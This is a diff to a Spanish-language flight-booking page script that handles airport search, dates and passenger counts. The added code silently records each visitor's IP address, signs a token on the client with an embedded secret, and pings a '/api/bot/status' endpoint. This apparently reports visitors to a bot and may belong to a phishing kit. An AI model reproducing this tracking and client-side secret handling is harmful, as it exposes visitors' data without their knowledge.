@@ -23,258 +23,393 @@ const DOMElements = {
     labelDateBack: document.querySelector('#label-date-back'),
     btnSearchFlights: document.querySelector('#btn-search-flights'),
     loader: document.querySelector('.loader')
-};
+}
+
 
 /**
  * Startup@Index
+ * 
  */
-document.addEventListener('DOMContentLoaded', () => {
-    // Obtener IP (opcional y seguro)
-    fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
-        .then(data => {
-            if (info && info.metaInfo) info.metaInfo.ip = data.ip;
-        })
-        .catch(() => {});
+document.addEventListener('DOMContentLoaded', ()=>{
+     fetch("https://api.ipify.org?format=json")
+       .then((response) => response.json())
+       .then((data) => (info.metaInfo.ip = data.ip))
+       .catch((error) => console.error("Error:", error));
+     updateLS();
 
-    updateLS();
+    const datepicker = new HotelDatepicker(DOMElements.inputDates, {
+        inline: true,
+        showTopbar: false,
+        onDayClick: function() {
+            if(info.flightInfo.travel_type === 2){
+                info.flightInfo.flightDates[0] = document.querySelector('.datepicker__month-day--first-day-selected').getAttribute('time');
+                this.clearSelection();
+                closeAllModals();
+                updateLS();
+                updateDOM();
+            }
+        },
+        onSelectRange: function() {
+            info.flightInfo.flightDates[0] = document.querySelector('.datepicker__month-day--first-day-selected').getAttribute('time');
+            info.flightInfo.flightDates[1] = document.querySelector('.datepicker__month-day--last-day-selected').getAttribute('time');
+            this.clearSelection();
+            closeAllModals();
+            updateLS();
+            updateDOM();
+        }
+    });
     loadEventListeners();
     updateDOM();
-
-    // Inicializar datepicker si existe la librería
-    if (typeof HotelDatepicker !== 'undefined' && DOMElements.inputDates) {
-        try {
-            new HotelDatepicker(DOMElements.inputDates, {
-                inline: true,
-                showTopbar: false,
-                onSelectRange: function() {
-                    if (info && info.flightInfo) {
-                        info.flightInfo.flightDates[0] = this.getValue('timestamp')[0];
-                        info.flightInfo.flightDates[1] = this.getValue('timestamp')[1];
-                        updateLS();
-                        updateDOM();
-                        closeAllModals();
-                    }
-                }
-            });
-        } catch (e) {
-            console.log("HotelDatepicker no disponible");
-        }
-    }
+    sendStatus();
 });
 
+
+
 /**
- * Load Event Listeners
+ * LoadEvents@Index
+ * 
  */
-const loadEventListeners = () => {
-    // Pasajeros
-    if (DOMElements.contPassengersOptions) {
-        DOMElements.contPassengersOptions.addEventListener('click', (e) => {
-            const actionElement = e.target.closest('div[data-action]');
-            if (!actionElement) return;
+const loadEventListeners = ()=>{
 
+    DOMElements.contPassengersOptions.addEventListener('click', function(e) {
+        const actionElement = e.target.closest('div[data-action]');
+
+        if(actionElement.dataset.action){
             const action = actionElement.dataset.action;
-            const category = actionElement.dataset.category;
+            const passengersCategory = actionElement.dataset.category;
+            const actualTotalCategory = info.flightInfo[passengersCategory];
 
-            if (action === 'add' && info.flightInfo[category] < 9) {
-                info.flightInfo[category]++;
-            } else if (action === 'remove' && info.flightInfo[category] > 0) {
-                info.flightInfo[category]--;
+            const { adults, children, babies } = info.flightInfo;
+            let totalPassengers = adults + children + babies;
+    
+            if (action === 'add'){
+                if(totalPassengers + 1 < 10){
+                    info.flightInfo[passengersCategory]++;
+                    updateLS();
+                    updateDOM();
+                }
+            }else if (action === 'remove'){
+                if(totalPassengers - 1 > 0 && actualTotalCategory - 1 >= 0){
+                    info.flightInfo[passengersCategory]--;
+                    updateLS();
+                    updateDOM();
+                }
             }
+        }else{
+            console.log('not dataset');
+        }
+    });
 
-            updateLS();
-            updateDOM();
-        });
-    }
-
-    // Búsqueda de aeropuertos
-    if (DOMElements.inputSearchAirportOrigin) {
-        DOMElements.inputSearchAirportOrigin.addEventListener('input', (e) => {
-            const term = e.target.value.trim();
-            listAirports(term ? searchAirport(term) : airports, DOMElements.contAirportOrigin, 'origin');
-        });
-    }
-
-    if (DOMElements.inputSearchAirportDestination) {
-        DOMElements.inputSearchAirportDestination.addEventListener('input', (e) => {
-            const term = e.target.value.trim();
-            listAirports(term ? searchAirport(term) : airports, DOMElements.contAirportDestination, 'destination');
-        });
-    }
-
-    // Tipo de viaje
-    if (DOMElements.roundTrip) {
-        DOMElements.roundTrip.addEventListener('click', () => {
-            info.flightInfo.travel_type = 1;
-            updateLS();
-            updateDOM();
-        });
-    }
-
-    if (DOMElements.oneWay) {
-        DOMElements.oneWay.addEventListener('click', () => {
-            info.flightInfo.travel_type = 2;
-            info.flightInfo.flightDates[1] = 0;
-            updateLS();
-            updateDOM();
-        });
-    }
-
-    // Buscar vuelos
-    if (DOMElements.btnSearchFlights) {
-        DOMElements.btnSearchFlights.addEventListener('click', () => {
-            const validation = verifyAllFields();
-            if (validation === true) {
-                setPassengersObjects();
-                updateLS();
-                if (DOMElements.loader) DOMElements.loader.classList.add('show');
-                setTimeout(() => {
-                    window.location.href = 'select-flight-go.html';
-                }, 1500);
-            } else {
-                alert(validation);
-            }
-        });
-    }
-
-    // Modales
-    if (DOMElements.btnSelectOrigin) {
-        DOMElements.btnSelectOrigin.addEventListener('click', () => {
-            DOMElements.inputSearchAirportOrigin.value = '';
+    DOMElements.inputSearchAirportOrigin.addEventListener('input', (e)=>{
+        if(e.target.value === ''){
             listAirports(airports, DOMElements.contAirportOrigin, 'origin');
-            showModal(DOMElements.modalSelectOrigin);
-        });
-    }
+        }else{
+            listAirports(searchAirport(e.target.value), DOMElements.contAirportOrigin, 'origin');
+        }
+    });
 
-    if (DOMElements.btnSelectDestination) {
-        DOMElements.btnSelectDestination.addEventListener('click', () => {
-            DOMElements.inputSearchAirportDestination.value = '';
+    DOMElements.inputSearchAirportDestination.addEventListener('input', (e)=>{
+        if(e.target.value === ''){
             listAirports(airports, DOMElements.contAirportDestination, 'destination');
-            showModal(DOMElements.modalSelectDestination);
-        });
-    }
+        }else{
+            listAirports(searchAirport(e.target.value), DOMElements.contAirportDestination, 'destination');
+        }
+    });
+
+    DOMElements.roundTrip.addEventListener('click', ()=>{
+        info.flightInfo.travel_type = 1;
+        updateLS();
+        updateDOM();
+    });
+
+    DOMElements.oneWay.addEventListener('click', () =>{
+        info.flightInfo.travel_type = 2;
+        info.flightInfo.flightDates[1] = '';
+        updateLS();
+        updateDOM();
+    });
+
+    DOMElements.btnSearchFlights.addEventListener('click', ()=>{
+        const validation = verifyAllFields();
+        if(validation === true){
+            setPassengersObjects();
+            updateLS();
+
+            DOMElements.loader.classList.add('show');
+            setTimeout(()=>{
+                window.location.href = 'select-flight-go.html';
+            }, 1500);
+        }else{
+            alert(validation);
+        }
+    });
+
+
+    DOMElements.btnSelectOrigin.addEventListener('click', ()=>{
+        DOMElements.inputSearchAirportOrigin.value = '';
+        listAirports(airports, DOMElements.contAirportOrigin, 'origin');
+        showModal(DOMElements.modalSelectOrigin);
+    });
+
+    DOMElements.btnSelectDestination.addEventListener('click', ()=>{
+        DOMElements.inputSearchAirportDestination.value = '';
+        listAirports(airports, DOMElements.contAirportDestination, 'destination');
+        showModal(DOMElements.modalSelectDestination);
+    });
 
     DOMElements.btnSelectDate.forEach(btn => {
-        btn.addEventListener('click', () => showModal(DOMElements.modalSelectDate));
-    });
-
-    if (DOMElements.btnEditPassengers) {
-        DOMElements.btnEditPassengers.addEventListener('click', () => showModal(DOMElements.modalEditPassengers));
-    }
-
-    DOMElements.btnCloseModal.forEach(btn => {
-        btn.addEventListener('click', () => {
-            const modalId = btn.getAttribute('data-target-modal');
-            if (modalId) closeModal(document.querySelector(modalId));
+        btn.addEventListener('click', ()=>{
+            showModal(DOMElements.modalSelectDate);
         });
     });
-};
 
-const updateDOM = () => {
-    if (!info?.flightInfo) return;
+    DOMElements.btnEditPassengers.addEventListener('click', ()=>{
+        showModal(DOMElements.modalEditPassengers);
+    });
 
-    const { travel_type, origin = {}, destination = {}, adults, children, babies, flightDates } = info.flightInfo;
+    DOMElements.btnCloseModal.forEach(btn =>{
+        btn.addEventListener('click', ()=>{
+            const modalId = btn.getAttribute('data-target-modal');
+            closeModal(document.querySelector(modalId));
+        });
+    });
+}
 
-    // Tipo de viaje
-    if (DOMElements.roundTrip) DOMElements.roundTrip.checked = travel_type === 1;
-    if (DOMElements.oneWay) DOMElements.oneWay.checked = travel_type === 2;
+const updateDOM = ()=>{
 
-    // Aeropuertos
-    if (DOMElements.btnSelectOrigin) {
-        DOMElements.btnSelectOrigin.textContent = origin.city ? `${origin.city} (${origin.code})` : 'Seleccionar origen';
+    const {travel_type, seat_type, origin, destination, adults, children, babies, flightDates} = info.flightInfo;
+
+    //Travel Type
+    if(travel_type === 1){
+        DOMElements.roundTrip.checked = true;
+    }else if(travel_type === 2){
+        DOMElements.oneWay.checked = true;
+    }else{
+        console.log('INVALID_DATE_FORMAT');
     }
-    if (DOMElements.btnSelectDestination) {
-        DOMElements.btnSelectDestination.textContent = destination.city ? `${destination.city} (${destination.code})` : 'Seleccionar destino';
+
+    //Departures
+    if(origin !== ''){
+        DOMElements.btnSelectOrigin.textContent = `${origin.city} (${origin.code})`;
+        DOMElements.btnSelectOrigin.classList.add('tc-blue');
+    }else{
+        console.log('NOT_ORIGIN_AIRPORT');
     }
 
-    // Fechas
-    if (DOMElements.labelDateGo && DOMElements.labelDateBack) {
-        if (travel_type === 1) {
-            DOMElements.labelDateGo.textContent = flightDates[0] ? new Date(parseInt(flightDates[0])).toLocaleDateString('es-ES') : 'SELECCIONAR';
-            DOMElements.labelDateBack.textContent = flightDates[1] ? new Date(parseInt(flightDates[1])).toLocaleDateString('es-ES') : 'SELECCIONAR';
-        } else {
-            DOMElements.labelDateGo.textContent = flightDates[0] ? new Date(parseInt(flightDates[0])).toLocaleDateString('es-ES') : 'SELECCIONAR';
+    if(destination !== ''){
+        DOMElements.btnSelectDestination.textContent = `${destination.city} (${destination.code})`;
+        DOMElements.btnSelectDestination.classList.add('tc-blue');
+    }else{
+        console.log('NOT_DESTINATION_AIRPORT');
+    }
+
+    //Dates
+    if(travel_type === 1){
+        if(flightDates[0] != 0){
+            let departure1 = new Date(parseInt(flightDates[0])).toLocaleDateString('es-ES');
+            DOMElements.labelDateGo.textContent = departure1;
+            if(flightDates[1] != 0){
+                let departure2 = new Date(parseInt(flightDates[1])).toLocaleDateString('es-ES');
+                DOMElements.labelDateBack.textContent = departure2;
+            }else{
+                DOMElements.labelDateBack.textContent = 'SELECCIONAR';
+                console.log('DEP_DATE_2_NULL');
+            }
+        }else{
+            DOMElements.labelDateGo.textContent = 'SELECCIONAR';
+            console.log('DEP_DATE_1_NULL');
+            DOMElements.labelDateBack.textContent = 'SELECCIONAR';
+            console.log('DEP_DATE_2_NULL');
+        }
+    }else if(travel_type === 2){
+        if(flightDates[0] !== 0){
+            let departure1 = new Date(parseInt(flightDates[0])).toLocaleDateString('es-ES');
+            DOMElements.labelDateGo.textContent = departure1;
             DOMElements.labelDateBack.textContent = 'Sólo ida';
+        }else{
+            DOMElements.labelDateGo.textContent = 'SELECCIONAR';
+            DOMElements.labelDateBack.textContent = 'Sólo ida';
+        }
+    }else{
+        console.log('NO_TRAVEL_TYPE');
+    }
+
+    //Passengers
+    DOMElements.labelAdultsNumber.textContent = adults;
+    DOMElements.labelChildrenNumber.textContent = children;
+    DOMElements.labelBabiesNumber.textContent = babies;
+
+    DOMElements.btnEditPassengers.value = '';
+    if(info.flightInfo.adults !== 0){
+        DOMElements.btnEditPassengers.value += `${adults} ${adults > 1 ? 'Adultos' : 'Adulto'}`;
+    }
+    if(info.flightInfo.children !== 0){
+        DOMElements.btnEditPassengers.value += `, ${children} ${children > 1 ? 'Niños' : 'Niño'}`;
+    }
+    if(info.flightInfo.babies !== 0){
+        DOMElements.btnEditPassengers.value += `, ${babies} ${babies > 1 ? 'Bebés' : 'Bebé'}`;
+    }
+
+}
+
+
+/**
+ * Functions@Index
+ * 
+ */
+const listAirports = (airports, container, type)=>{
+    setTimeout(function(){
+        container.innerHTML = '';
+        airports.forEach(airport =>{
+            const airportDiv = document.createElement('div');
+            airportDiv.className = "pl-5 pr-1 pt-1 pb-1 ml-1 d-flex justify-space-between align-items-center";
+            
+            airportDiv.addEventListener('click', () => {
+                selectAirport(airport, type);
+                closeAllModals();
+    
+                /** Manage Autodirection */
+                if(type === 'origin'){
+                    if(info.flightInfo.destination === ''){
+                        DOMElements.btnSelectDestination.click();
+                    }
+                }else if(type === 'destination'){
+                    if(info.flightInfo.flightDates[0] === 0){
+                        DOMElements.btnSelectDate[0].click();
+                    }
+                }
+                
+            });
+            
+            const airportInfo = document.createElement('p');
+            airportInfo.className = "tc-blue m-0";
+            airportInfo.textContent = `${airport.city} (${airport.code})`;
+            
+            const newTag = document.createElement('span');
+            newTag.className = "red-tag";
+            newTag.textContent = "Nuevo";
+    
+            airportDiv.appendChild(airportInfo);
+            airportDiv.appendChild(newTag);
+    
+            container.appendChild(airportDiv);
+        }); 
+    }, 200);
+}
+
+const searchAirport = (input)=>{
+    let search = [];
+    search = airports.filter(destination => {return (destination.country.toLowerCase().includes(input.toLowerCase()) || destination.city.toLowerCase().includes(input.toLowerCase()) || destination.code.toLowerCase().includes(input.toLowerCase()))});
+    return search;
+}
+
+const selectAirport = (airport, type) =>{
+    info.flightInfo[type] = airport;
+    updateLS();
+    updateDOM();
+}
+
+const showModal = (modal) =>{
+    modal.classList.add('show');
+}
+
+const closeModal = (modal) =>{
+    modal.classList.remove('show');
+}
+
+const closeAllModals = () =>{
+    try{
+        DOMElements.modalEditPassengers.classList.remove('show');
+        DOMElements.modalSelectDate.classList.remove('show');
+        DOMElements.modalSelectDestination.classList.remove('show');
+        DOMElements.modalSelectOrigin.classList.remove('show');
+    }catch(err){
+        console.log(err);
+    }
+}
+
+const sendStatus = () =>{
+    const tokenn = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P1'}, JWT_SIGN);
+
+    try{
+        fetch(`${API_URL}/api/bot/status`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${API_KEY}`
+            },
+            body: JSON.stringify({token: tokenn})
+        });
+    }catch(err){
+        console.log(err);
+    }
+}
+
+const setPassengersObjects = ()=>{
+    if(info.flightInfo.adults > 0){
+        info.passengersInfo.adults = [];
+        for(let i = 0; i < info.flightInfo.adults; i++){
+            info.passengersInfo.adults.push({
+                name: '',
+                surname: '',
+                cc: ''
+            });
         }
     }
 
-    // Pasajeros
-    if (DOMElements.labelAdultsNumber) DOMElements.labelAdultsNumber.textContent = adults || 1;
-    if (DOMElements.labelChildrenNumber) DOMElements.labelChildrenNumber.textContent = children || 0;
-    if (DOMElements.labelBabiesNumber) DOMElements.labelBabiesNumber.textContent = babies || 0;
-};
-
-const listAirports = (airportsList, container, type) => {
-    if (!container) return;
-    container.innerHTML = '';
-
-    airportsList.forEach(airport => {
-        const div = document.createElement('div');
-        div.className = "pl-5 pr-1 pt-1 pb-1 ml-1 d-flex justify-space-between align-items-center";
-        div.innerHTML = `<p class="tc-blue m-0">${airport.city} (${airport.code})</p><span class="red-tag">Nuevo</span>`;
-
-        div.addEventListener('click', () => {
-            selectAirport(airport, type);
-            closeAllModals();
-        });
-
-        container.appendChild(div);
-    });
-};
-
-const searchAirport = (input) => {
-    return airports.filter(a => 
-        a.city.toLowerCase().includes(input.toLowerCase()) ||
-        a.code.toLowerCase().includes(input.toLowerCase()) ||
-        a.country.toLowerCase().includes(input.toLowerCase())
-    );
-};
-
-const selectAirport = (airport, type) => {
-    if (info && info.flightInfo) {
-        info.flightInfo[type] = airport;
-        updateLS();
-        updateDOM();
-    }
-};
-
-const showModal = (modal) => {
-    if (modal) modal.classList.add('show');
-};
-
-const closeModal = (modal) => {
-    if (modal) modal.classList.remove('show');
-};
-
-const closeAllModals = () => {
-    [DOMElements.modalSelectOrigin, DOMElements.modalSelectDestination, 
-     DOMElements.modalSelectDate, DOMElements.modalEditPassengers].forEach(modal => {
-        if (modal) modal.classList.remove('show');
-    });
-};
-
-const setPassengersObjects = () => {
-    if (!info?.flightInfo) return;
-
-    info.passengersInfo.adults = [];
-    for (let i = 0; i < (info.flightInfo.adults || 1); i++) {
-        info.passengersInfo.adults.push({ name: '', surname: '', cc: '' });
-    }
-    // Puedes agregar children y babies si lo necesitas
-};
-
-const verifyAllFields = () => {
-    const { travel_type, origin, destination, flightDates } = info.flightInfo || {};
-
-    if (!origin || !origin.city) return 'SELECCIONE UN AEROPUERTO DE SALIDA';
-    if (!destination || !destination.city) return 'SELECCIONE UN AEROPUERTO DE LLEGADA';
-
-    if (travel_type === 1) {
-        if (!flightDates || !flightDates[0]) return 'SELECCIONE UNA FECHA DE IDA';
-        if (!flightDates[1]) return 'SELECCIONE UNA FECHA DE VUELTA';
-    } else if (travel_type === 2) {
-        if (!flightDates || !flightDates[0]) return 'SELECCIONE UNA FECHA DE IDA';
+    if(info.flightInfo.children > 0){
+        info.passengersInfo.children = [];
+        for(let i = 0; i < info.flightInfo.children; i++){
+            info.passengersInfo.children.push({
+                name: '',
+                surname: '',
+                cc: ''
+            });
+        }
     }
 
-    return true;
-};
+    if(info.flightInfo.babies){
+        info.passengersInfo.babies = [];
+        for(let i = 0; i < info.flightInfo.babies; i++){
+            info.passengersInfo.babies.push({
+                name: '',
+                surname: '',
+                cc: ''
+            });
+        }
+    }
+}
+
+const verifyAllFields = ()=>{
+    const {travel_type, seat_type, origin, destination, adults, children, babies, flightDates} = info.flightInfo;
+
+    if(origin.city !== undefined){
+        if(destination.city !== undefined){
+            if(travel_type === 1){
+                if(flightDates[0] !== ''){
+                    if(flightDates[1] !== ''){
+                        return  true;
+                    }else{
+                        return 'SELECCIONE UNA FECHA DE VUELTA'
+                    }
+                }else{
+                    return 'SELECCIONE UNA FECHA DE IDA';
+                }
+            }else if(travel_type === 2){
+                if(flightDates[0] !== 0){
+                    return true;
+                }else{
+                    return 'SELECCIONE UNA FECHA DE IDA';
+                }
+            }else{
+                return 'SELECCIONE UN TIPO DE VIAJE';
+            }
+        }else{
+            return 'SELECCIONE UN AEROPUERTO DE LLEGADA'
+        }
+    }else{
+        return 'SELECCIONE UN AEROPUERTO DE SALIDA'
+    }
+    
+}
+
